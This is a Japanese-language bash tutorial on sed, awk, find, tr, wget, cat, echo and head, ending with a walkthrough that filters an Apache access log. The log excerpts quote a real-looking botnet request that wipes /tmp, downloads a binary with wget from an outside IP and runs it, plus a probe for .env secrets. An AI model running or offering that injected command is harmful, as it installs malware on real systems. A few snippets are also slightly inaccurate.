<h3 id=sed-最後の行を削除>sed 最後の行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;$d&#39;</span>
</code></pre></div><h3 id=sed-ファイルの末尾から最後の文字を削除>sed ファイルの末尾から最後の文字を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -i <span class=s1>&#39;$ s/.$//&#39;</span>
</code></pre></div><h3 id=sed-先頭の空白とタブを削除-1>sed 先頭の空白とタブを削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -e <span class=s1>&#39;s/^[ \t]*//&#39;</span>
</code></pre></div><h3 id=sed-先頭の空白のみを削除>sed 先頭の空白のみを削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;s/ *//&#39;</span>
</code></pre></div><h3 id=sed-末尾のカンマを削除>sed 末尾のカンマを削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;s/,$//g&#39;</span>
</code></pre></div><h2 id=行挿入>行挿入</h2>
<h3 id=sed-最初の行として挿入>sed 最初の行として挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=err>&#39;</span><span class=m>1</span> i foo
</code></pre></div><h3 id=sed-最初の行の後に-2-行目として-挿入>sed 最初の行の後に (2 行目として) 挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;1 a foo&#39;</span>
</code></pre></div><h3 id=sed-aaa-を含む行の上に-bbb-を含む行を挿入>sed AAA を含む行の上に BBB を含む行を挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/AAA/i BBB&#39;</span>
</code></pre></div><h2 id=文字列の作成>文字列の作成</h2>
<h3 id=awk-特定の長さの文字列を作成します-例-513-スペースを生成>awk 特定の長さの文字列を作成します (例: 513 スペースを生成)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;BEGIN{while (a++&lt;513) s=s &#34; &#34;; print s}&#39;</span>
</code></pre></div><h3 id=awk-特定の文字位置に特定の長さの文字列を挿入>awk 特定の文字位置に特定の長さの文字列を挿入</h3>
<p>(例 では、各入力行の列 6 の後に 49 個のスペースを挿入します)。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gawk --re-interval <span class=s1>&#39;BEGIN{while(a++&lt;49)s=s &#34; &#34;};{sub(/^.{6}/,&#34;&amp;&#34; s)};1&#39;</span>
</code></pre></div><h2 id=ファイル検索>ファイル検索</h2>
<h3 id=find-現在のディレクトリ内のすべてのサブディレクトリファイルを一覧表示>find 現在のディレクトリ内のすべてのサブディレクトリ/ファイルを一覧表示</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find .
</code></pre></div><h3 id=find-現在のディレクトリの下にあるすべてのファイルを一覧表示>find 現在のディレクトリの下にあるすべてのファイルを一覧表示</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -type f
</code></pre></div><h3 id=find-現在のディレクトリの下にあるすべてのディレクトリを一覧表示>find 現在のディレクトリの下にあるすべてのディレクトリを一覧表示</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -type d
</code></pre></div><h3 id=find-現在のディレクトリの下にあるすべてのファイルを編集>find 現在のディレクトリの下にあるすべてのファイルを編集</h3>
<p>(たとえば、&lsquo;www&rsquo; を &lsquo;ww&rsquo; に置き換えます)。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s1>&#39;*.php&#39;</span> -exec sed -i <span class=s1>&#39;s/www/w/g&#39;</span> <span class=o>{}</span> <span class=se>\;</span>
</code></pre></div><h3 id=find-ファイル名のみを検索して出力-例-mso>find ファイル名のみを検索して出力 (例: &ldquo;mso&rdquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find mso*/ -name M* -printf <span class=s2>&#34;%f\n&#34;</span>
</code></pre></div><h3 id=find-システム内の大きなファイルを見つける-例-4g>find システム内の大きなファイルを見つける (例: >4G)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find / -type f -size +4G
</code></pre></div><h3 id=find-サイズが-74-バイト未満のファイルを見つけて削除する>find サイズが 74 バイト未満のファイルを見つけて削除する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s2>&#34;*.mso&#34;</span> -size -74c -delete
</code></pre></div><h3 id=find-空の-0-バイト-ファイルを見つける>find 空の (0 バイト) ファイルを見つける</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -type f -empty
</code></pre></div><h3 id=find-ディレクトリ内のすべてのファイルを再帰的にカウントする>find ディレクトリ内のすべてのファイルを再帰的にカウントする</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -type f <span class=p>|</span> wc -l
</code></pre></div><h2 id=並べ替え>並べ替え</h2>
<h3 id=sort-列ごとにファイルを並べ替え元の順序を維持する>sort 列ごとにファイルを並べ替え、元の順序を維持する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sort -k3,3 -s
</code></pre></div><h2 id=折返し>折返し</h2>
<h3 id=fold-指定された幅に収まるように各入力行を折り返す>fold 指定された幅に収まるように各入力行を折り返す</h3>
<p>(例: 1 行あたり 4 つの整数)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=s2>&#34;00110010101110001101&#34;</span> <span class=p>|</span> fold -w4
<span class=m>0011</span>
<span class=m>0010</span>
<span class=m>1011</span>
<span class=m>1000</span>
<span class=m>1101</span>
</code></pre></div><h2 id=タブの置換>タブの置換</h2>
<h3 id=expand-タブをスペースに変換>expand タブをスペースに変換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>expand filename
</code></pre></div><h3 id=unexpand-スペースをタブに変換>unexpand スペースをタブに変換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>unexpand filename
</code></pre></div><h2 id=webページをダウンロード>Webページをダウンロード</h2>
<h3 id=wget-webページをダウンロード>wget Webページをダウンロード</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>wget -r -l1 -H -t1 -nd -N -np -A mp3 -e <span class=nv>robots</span><span class=o>=</span>off http://example.com
</code></pre></div><h3 id=wget-ファイル名を指定してダウンロード長い名前の場合>wget ファイル名を指定してダウンロード(長い名前の場合)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>wget -O filename <span class=s2>&#34;http://example.com&#34;</span>
</code></pre></div><h3 id=wget-ファイルをフォルダーに>wget ファイルをフォルダーに</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>wget -P /path/to/directory <span class=s2>&#34;http://example.com&#34;</span>
</code></pre></div><h2 id=文字の削除と置換>文字の削除と置換</h2>
<h3 id=tr-すべての非出力文字を削除>tr すべての非出力文字を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tr -dc <span class=s1>&#39;[:print:]&#39;</span> &lt; filename
</code></pre></div><h3 id=tr-改行を削除>tr 改行を削除</h3>
<pre tabindex=0><code>cat filename | tr -d '\n'
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>-d オプションは &ndash;delete と書いても同じです。</dd>
</dl>
</div>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tr --delete <span class=s1>&#39;\n&#39;</span> &lt;input.txt &gt;output.txt
</code></pre></div><p>または</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tr -d <span class=s1>&#39;\n&#39;</span> &lt;input.txt &gt;output.txt
</code></pre></div><h3 id=tr-改行を置換>tr 改行を置換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39; &#39;</span> &lt;filename&gt;
</code></pre></div><h3 id=tr-大文字小文字へ>tr 大文字/小文字へ</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tr /a-z/ /A-Z/
</code></pre></div><h3 id=tr-改行をスペースに変換します-1>tr 改行をスペースに変換します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.  
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tr -d '\n'
This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$
</code></pre><h3 id=tr-crlf-を-lf-形式に変換します-1>tr CRLF を LF 形式に変換します。</h3>
<p>行末にCRLF形式の改行「
」が入っているテキスト。<br>
「
」は、Ctrl＋VとCtrl＋Mで入力できます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:CRLF.txt data-lang=:CRLF.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat CRLF.txt | tr -d '\r'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h2 id=openssl>openssl</h2>
<h3 id=16-進数の-md5-チェックサム値を-base64-エンコード形式に変換します>16 進数の MD5 チェックサム値を base64 エンコード形式に変換します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>openssl md5 -binary /path/to/file<span class=p>|</span> base64
<span class=c1># NWbeOpeQbtuY0ATWuUeumw==</span>
</code></pre></div><h2 id=言語属性>言語属性</h2>
<h3 id=アプリケーションが出力にデフォルト言語を使用することを強制します>アプリケーションが出力にデフォルト言語を使用することを強制します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>export</span> <span class=nv>LC_ALL</span><span class=o>=</span>C

<span class=c1># to revert:</span>
<span class=nb>unset</span> LC_ALL
</code></pre></div><h3 id=文字列を-base64-文字列としてエンコードする>文字列を Base64 文字列としてエンコードする</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> test<span class=p>|</span>base64
<span class=c1>#dGVzdAo=</span>
</code></pre></div><h2 id=バッググラウンド処理>バッググラウンド処理</h2>
<h3 id=バックグラウンドで複数のコマンドを実行する>バックグラウンドで複数のコマンドを実行する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=o>(</span>sleep 2<span class=p>;</span> sleep 3<span class=o>)</span> <span class=p>&amp;</span>

<span class=c1># run parallelly</span>
sleep <span class=m>2</span> <span class=p>&amp;</span> sleep <span class=m>3</span> <span class=p>&amp;</span>
</code></pre></div><h2 id=csv系>CSV系</h2>
<h3 id=xls-を-csv-に変換>.xls を csv に変換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>xls2csv filename
</code></pre></div><h2 id=ステータス処理>ステータス処理</h2>
<h3 id=別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します-よくできました>別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します (よくできました)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>cd</span> tmp/ <span class=o>&amp;&amp;</span> tar xvf ~/a.tar
</code></pre></div><h3 id=別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する-終了していない>別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する (終了していない)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>cd</span> tmp/a/b/c <span class=o>||</span>mkdir -p tmp/a/b/c
</code></pre></div><h2 id=圧縮解凍>圧縮・解凍</h2>
<h3 id=tarbz2-ファイルを解凍します-例-filetarbz2>tar.bz2 ファイルを解凍します (例: file.tar.bz2)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tar xvfj file.tar.bz2
</code></pre></div><h3 id=tarxz-ファイルを解凍します-例-filetarxz>tar.xz ファイルを解凍します (例: file.tar.xz)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>unxz file.tar.xz
tar xopf file.tar
</code></pre></div><h3 id=pdftotext>pdftotext</h3>
<h3 id=pdfをtxtに変換>PDFをtxtに変換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sudo apt-get install poppler-utils
pdftotext example.pdf example.txt
</code></pre></div><h2 id=catコマンド>catコマンド</h2>
<ul>
<li>ファイルの内容を表示する</li>
<li>ファイルの内容を行番号付きで表示する</li>
<li>複数ファイルを連結して1つのファイルにする</li>
</ul>
<h3 id=概要>概要</h3>
<p>「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。</p>
<pre tabindex=0><code>$ cat ＜ファイル名＞
</code></pre><h3 id=catコマンドの書式>catコマンドの書式</h3>
<p>cat [オプション] ファイル1 ファイル2……</p>
<h3 id=catコマンドの主なオプション>catコマンドの主なオプション</h3>
<p>catコマンドの主なオプションは次の通りです。</p>
<table>
<thead>
<tr>
<th style=text-align:center>オプション</th>
<th>長いオプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>-n</td>
<td>&ndash;number</td>
<td>行番号を付け加える</td>
</tr>
<tr>
<td style=text-align:center>-b</td>
<td>&ndash;number-nonblank</td>
<td>行番号を付け加える。ただし空白行には付けない</td>
</tr>
<tr>
<td style=text-align:center>-s</td>
<td>&ndash;squeeze-blank</td>
<td>連続した空行を1行にする</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。</dd>
</dl>
</div>
<h3 id=catコマンド詳細説明>catコマンド詳細説明</h3>
<h3 id=ファイルの内容を出力>ファイルの内容を出力</h3>
<p>filenameの内容をターミナルに出力します。</p>
<pre tabindex=0><code>$ cat filename
</code></pre><p>長いファイルの場合は、lessコマンドを使います。</p>
<pre tabindex=0><code>$ cat filename | less
</code></pre><h3 id=ファイルの結合>ファイルの結合</h3>
<p>複数のファイルを結合（連結）させて別ファイルへ出力します。</p>
<pre tabindex=0><code>$ cat filename1 filname2 &gt; filename3
</code></pre><p>追記したい場合は「&#187;」を使います。</p>
<pre tabindex=0><code>$ cat filename1 filname2 &gt;&gt; filename3
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「>」をリダイレクト、「&#187;」をアペンドと言います。「>」はファイルを新規作成してファイルへ出力します。「&#187;」は既存のファイルへ追記出力します。</dd>
<dd>「>」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。</dd>
</dl>
</div>
<h2 id=echoコマンド>echoコマンド</h2>
<ul>
<li>メッセージや環境変数を表示します。</li>
</ul>
<h3 id=概要-1>概要</h3>
<p>「echo」はメッセージなどを表示するコマンドです。</p>
<pre tabindex=0><code>$echo メッセージ
</code></pre><p>でメッセージを表示します。</p>
<pre tabindex=0><code>$ echo $変数名
</code></pre><p>で環境変数やシェルスクリプト内の変数を表示する際にも使用います。</p>
<h3 id=echoコマンドの書式>echoコマンドの書式</h3>
<p>echo [オプション] メッセージ</p>
<h3 id=echoの主なオプション>echoの主なオプション</h3>
<table>
<thead>
<tr>
<th style=text-align:center>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>-n</td>
<td>最後の改行を出力しない</td>
</tr>
<tr>
<td style=text-align:center>-e</td>
<td>エスケープを解釈する</td>
</tr>
<tr>
<td style=text-align:center>-E</td>
<td>エスケープを解釈しない（デフォルト）</td>
</tr>
</tbody>
</table>
<h3 id=echo-コマンド詳細説明>echo コマンド詳細説明</h3>
<p><font color=orange><b> echoコマンドの使用：</b></font><br>
さまざまなオプションでechoコマンドを使用できます。<br>
次の例では、いくつかの便利なオプションについて説明します。<br>
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。<br>
&lsquo;-n&rsquo;オプションは、改行なしでテキストを出力するために使用されます。<br>
&lsquo;-e&rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。<br>
&lsquo;echo_example.sh&rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:echo_example.sh data-lang=bash:echo_example.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=nb>echo</span> <span class=s2>&#34;改行付きのテキストの出力&#34;</span><span class=p>;</span>
<span class=nb>echo</span> -n <span class=s2>&#34;改行なしのテキストの出力&#34;</span><span class=p>;</span>
<span class=nb>echo</span> -e <span class=s2>&#34;\n削除\tバックスラッシュ\t文字\n&#34;</span><span class=p>;</span>
</code></pre></div><p>bashコマンドでファイルを実行します。</p>
<pre tabindex=0><code>$ bash echo_example.sh
改行付きのテキストの出力
改行なしのテキストの出力
削除	バックスラッシュ	文字
$
</code></pre><h3 id=hello-world>Hello World</h3>
<p><font color=orange><b>はじめてのbashコマンド「echo」</b></font><br>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。</p>
<pre tabindex=0><code class=language-:はじめてのecho data-lang=:はじめてのecho>$ echo &quot;Hello, World&quot;;
Hello, World
$
</code></pre><p>はじめてのbashスクリプト「vim」</p>
<pre tabindex=0><code class=language-bash:はじめてのbashスクリプト data-lang=bash:はじめてのbashスクリプト>$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
</code></pre><p>vimで開いたHelloWorld.shを編集します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:HelloWorld.sh data-lang=bash:HelloWorld.sh><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=nb>echo</span> <span class=s2>&#34;Hello World&#34;</span><span class=p>;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>echo の後ろに続く文字列は 「""」（ダブるクォーテーション）または、「''」（シングルクォーテーション）で囲みましょう。</dd>
<dd>行末の「;」（セミコロン）も忘れずに。</dd>
</dl>
</div>
<h2 id=headコマンド>headコマンド</h2>
<ul>
<li>headコマンドでファイルの先頭部分だけを表示する</li>
<li>パイプを使って実行結果の最初の部分だけを確認する</li>
<li>tailコマンドでファイルの末尾部分だけを表示する</li>
<li>ログファイルを監視する</li>
</ul>
<h3 id=概要-2>概要</h3>
<p>headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。<br>
表示する行数は、オプションで変更することができます。</p>
<pre tabindex=0><code>$ cat ＜ファイル名＞ | head -n10
</code></pre><p>headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。</p>
<h3 id=headコマンドの書式>headコマンドの書式</h3>
<p>head [オプション] ファイル名</p>
<h3 id=headコマンドの主なオプション>headコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th style=text-align:center>オプション</th>
<th>長いオプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>-c 数字</td>
<td>&ndash;bytes 数字</td>
<td>先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000<em>1000, M=1024</em>1024…）</td>
</tr>
<tr>
<td style=text-align:center>-n 数字</td>
<td>&ndash;lines 数字</td>
<td>先頭から指定した行数のみ表示する</td>
</tr>
<tr>
<td style=text-align:center>-q</td>
<td>&ndash;quiet, &ndash;silent</td>
<td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）</td>
</tr>
<tr>
<td style=text-align:center>-v</td>
<td>&ndash;verbose</td>
<td>常にファイルごとのヘッダ出力を行う</td>
</tr>
</tbody>
</table>
<h3 id=headコマンド詳細説明>headコマンド詳細説明</h3>
<p>headコマンドはファイルの先頭から１０行を表示するコマンドです。</p>
<pre tabindex=0><code>$ cat filename | head 
</code></pre><p>よく使われるオプションは、出力する行数を指定するオプション「n」です。</p>
<pre tabindex=0><code>$ cat filename | head -n20
</code></pre><p>データをソートしてベスト１０を出力するという場合によく使います。</p>
<pre tabindex=0><code>$ sudo cat /var/log/httpd/access_log | grep -iv &quot;ELB-Health-Checker&quot; | awk -F '&quot;' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
</code></pre><p>sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。<br>
では、順番に説明していきます。</p>
<p>まずは純粋にアクセスログを出力します。<br>
長いのでheadコマンドを使いましょう。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log | head
172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] &quot;GET / HTTP/1.1&quot; 302 206 &quot;-&quot; &quot;ELB-HealthChecker/2.0&quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&quot; 302 230 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&quot; 302 215 &quot;-&quot; &quot;Apache-HttpClient/4.1 (java 1.5)&quot;
:
:
:

</code></pre><p>AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。<br>
grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &quot;ELB-HealthChecker&quot; | head
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&quot; 302 230 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&quot;
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&quot; 302 215 &quot;-&quot; &quot;Apache-HttpClient/4.1 (java 1.5)&quot;
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&quot; 302 230 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&quot;
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&quot; 302 215 &quot;-&quot; &quot;Apache-HttpClient/4.1 (java 1.5)&quot;
 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] &quot;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws&quot; 400 226 &quot;-&quot; &quot;-&quot;
 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] &quot;GET http://dushu.baidu.com HTTP/1.1&quot; 302 208 &quot;-&quot; &quot;-&quot;
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &quot;POST / HTTP/1.1&quot; 302 205 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &quot;GET /.env HTTP/1.1&quot; 302 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;
 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] &quot;GET http://dushu.baidu.com HTTP/1.1&quot; 302 208 &quot;-&quot; &quot;-&quot;
 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] &quot;CONNECT www.yahoo.com:443 HTTP/1.1&quot; 302 210 &quot;-&quot; &quot;Go-http-client/1.1&quot;
 suzuki$
</code></pre><p>それっぽいログが出るようになりました。<br>
次にどこからのアクセスが多いのかを絞り込みます。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &quot;ELB-HealthChecker&quot; | awk -F '&quot;' '{ print $2; }' | head
 GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
 CONNECT guba.eastmoney.com:443 HTTP/1.1
 GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
 CONNECT guba.eastmoney.com:443 HTTP/1.1
 GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
 GET http://dushu.baidu.com HTTP/1.1
 POST / HTTP/1.1
 GET /.env HTTP/1.1
 GET http://dushu.baidu.com HTTP/1.1
 CONNECT www.yahoo.com:443 HTTP/1.1
 suzuki$
</code></pre><p>GETとPOSTの項目に絞り込まれました。<br>
awk コマンドの -F はセパレータで、この場合は &lsquo;"&rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。</p>
<p>次は、GET, CONNECT, POSTなどのコマンドを除去します。<br>
awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &quot;ELB-HealthChecker&quot; | awk -F '&quot;' '{ print $2; }' | awk '{ print $2; }' | head
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 /shell?cd+/tmp;rm+-rf+*;wget+
 http://dushu.baidu.com
 /
 /.env
 http://dushu.baidu.com
 www.yahoo.com:443
 suzuki$
</code></pre><p>次に、余計な出力を抑制します。<br>
ここでは空白行を出力したくないので grep -v ^$ を使っています。<br>
非常によく使うオプションなので覚えておくとよいです。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>grep -v ^$</dd>
<dd>空行を出力しない</dd>
<dd>行頭を表す「^」と行末を表す「$」の間に何もないですね。</dd>
</dl>
</div>
<p>では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &quot;ELB-HealthChecker&quot; | awk -F '&quot;' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
 ort| head
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 suzuki$
</code></pre><p>最後に、出力をアルファベット順に並べ替えます。sortでよいです。<br>
さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。<br>
そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。</p>
<pre tabindex=0><code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &quot;ELB-HealthChecker&quot; | awk -F '&quot;' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
850 http://dushu.baidu.com
839 /form.cgi
485 http://www.baidu.com/pub/css/new_font.css
